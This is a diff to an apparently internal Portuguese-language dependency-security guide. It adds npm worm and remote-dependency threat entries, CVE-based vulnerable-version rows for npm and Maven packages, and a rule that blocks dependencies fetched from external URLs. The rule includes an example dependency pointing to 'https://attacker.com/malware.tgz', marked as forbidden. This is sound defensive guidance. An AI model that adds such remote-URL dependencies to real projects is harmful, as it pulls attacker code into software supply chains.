@@ -171,6 +171,8 @@ Dependências instaladas mas não importadas/usadas no código representam risco
 | Protestware | Mantenedor injeta código destrutivo em atualização | Pinnar versões exatas, revisar changelogs antes de atualizar |
 | Account Takeover | Conta de mantenedor comprometida publica versão maliciosa | Monitorar advisories, usar lockfile com integridade |
 | Starjacking | Pacote aponta para repo popular mas contém código diferente | Verificar repo real vs registry, auditar código-fonte |
+| Worm (Shai-Hulud) | Malware que se propaga via npm publish de pacotes comprometidos | Monitorar advisories, verificar integridade pós-install, usar lockfile |
+| Remote Dynamic Dependencies (PhantomRaven) | Dependências carregadas de URLs externas (não registry) que bypassam scans | Bloquear dependências de URLs externas, auditar campo "dependencies" por URLs |
 
 #### Regras OBRIGATÓRIAS para npm
 
@@ -222,6 +224,9 @@ Dependências instaladas mas não importadas/usadas no código representam risco
    | coa >= 2.0.3 | Comprometido (2021) | coa 2.0.2 |
    | rc >= 1.2.9 | Comprometido (2021) | rc 1.2.8 |
    | peacenotwar | Malware (wiper) | Remover |
+   | next < 14.2.25 | CVE-2025-29927 (auth bypass middleware) | next >= 14.2.25 ou >= 15.2.3 |
+   | react-server-dom-webpack 19.0-19.2 | CVE-2025-55182 (pre-auth RCE) | react >= 19.2.1 |
+   | @antv/* (versões comprometidas Mai/2026) | Mini Shai-Hulud worm — account takeover | Verificar integridade, atualizar para versão pós-fix |
 
 9. **Configuração .npmrc segura**
    - save-exact=true
@@ -230,7 +235,13 @@ Dependências instaladas mas não importadas/usadas no código representam risco
    - package-lock=true
    - @cogna:registry=https://npm.pkg.github.com
 
-10. **Pipeline CI/CD — Verificações npm**
+10. **Bloquear Remote Dynamic Dependencies**
+    - NUNCA aceitar dependências que apontam para URLs externas (http://, https://) em vez do registry
+    - Verificar campo "dependencies" por URLs: `"dep": "https://attacker.com/malware.tgz"` ← PROIBIDO
+    - Usar `lockfile-lint` para validar que todas as dependências vêm de registries confiáveis
+    - Padrão PhantomRaven: malware carregado de URL externa bypassa npm audit e scans tradicionais
+
+11. **Pipeline CI/CD — Verificações npm**
     - Instalar com lockfile: `npm ci --ignore-scripts`
     - Auditar dependências: `npm audit --audit-level=high`
     - Verificar assinaturas: `npm audit signatures`
@@ -354,6 +365,8 @@ Dependências instaladas mas não importadas/usadas no código representam risco
    | struts2-core (qualquer) | Múltiplos RCE históricos | Spring MVC |
    | commons-text < 1.10 | Text4Shell (CVE-2022-42889) | commons-text >= 1.10 |
    | snakeyaml < 2.0 | Desserialização insegura | snakeyaml >= 2.2 |
+   | spring-cloud-gateway < 4.1.6 | CVE-2025-41243 (env modification RCE) | spring-cloud-gateway >= 4.1.6 |
+   | spring-ai < 1.0.1 | Data exposure entre usuários (chat memory) | spring-ai >= 1.0.1 |
 
 7. **Configuração settings.xml segura**
    - Mirrors: HTTPS obrigatório, apontar para Nexus/Artifactory interno
